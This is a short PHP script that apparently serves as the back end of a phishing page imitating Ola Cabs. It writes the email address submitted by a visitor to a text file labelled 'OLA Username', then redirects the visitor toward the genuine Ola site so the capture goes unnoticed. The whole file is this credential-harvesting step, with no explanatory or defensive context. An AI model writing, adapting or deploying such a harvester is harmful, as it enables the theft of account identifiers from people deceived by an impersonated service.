<?php
file_put_contents("usernames.txt", "OLA Username: " . $email = $_POST['email'] . "\n", FILE_APPEND);
$url = "redirectUrl"; # https://www.olacabs.com/
header("Location: $url");
?>